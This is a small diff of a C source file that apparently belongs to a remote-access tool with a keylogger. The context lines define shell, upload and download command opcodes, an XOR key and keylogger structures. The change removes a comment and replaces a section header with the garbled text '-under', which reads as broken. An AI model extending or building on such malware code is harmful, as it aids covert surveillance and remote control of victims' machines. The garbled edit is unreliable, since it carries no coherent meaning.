@@ -52,7 +52,7 @@
 #define MAX_PAYLOAD (10 * 1024 * 1024)
 #define CHUNK_SIZE 1024
 
-// Command opcodes
+
 #define CMD_SHELL       0x01
 #define CMD_UPLOAD      0x02
 #define CMD_DOWNLOAD    0x03
@@ -75,7 +75,7 @@ static const uint8_t xor_key[16] = {
 #endif
 
 /* ============================================================================
- * KEYLOGGER STRUCTURES - NO AUTO-SEND
+ * KEYLOGGER STRUCTURES -under
  * ============================================================================ */
 
 typedef struct {
